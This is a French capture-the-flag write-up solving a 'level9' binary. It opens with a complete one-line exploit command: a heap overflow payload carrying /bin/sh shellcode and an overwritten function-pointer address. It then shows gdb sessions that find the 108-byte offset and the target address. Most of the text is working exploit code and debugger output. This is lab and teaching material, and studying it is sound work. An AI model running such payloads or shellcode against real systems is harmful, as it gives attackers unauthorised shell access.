# Soluce

```
/level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
```
## Explication de l'exploit

l offset est egale a 108 car la data est malloc a 6c
ensuite on vois que eax cela overflow a sur eax et qu'il est dereferencer car utiliser comme un pointeur sur fonction
il suffira d'utiliser un shellcode grace a l adresse de eax afin de lancer un shell

etape 1 :

```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register
eax            0x41366441	1094083649
ecx            0x3965	14693
edx            0x804a0a2	134520994
ebx            0x804a078	134520952
esp            0xbffff680	0xbffff680
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
eflags         0x210283	[ CF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Du coup l'offset est sur Ad6A donc 108

etape 2 :

Trouver l'adresse de EAX
```
......
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
......
End of assembler dump.
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) run AAAA
Starting program: /home/user/level9/level9 AAAA

Breakpoint 1, 0x0804867c in main ()
(gdb) info register
eax            0x804a00c	134520844
..........
```

- Une fois l'adresse de EAX trouve, on peut ecrire notre payload sur 108 octets :

```
\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"
```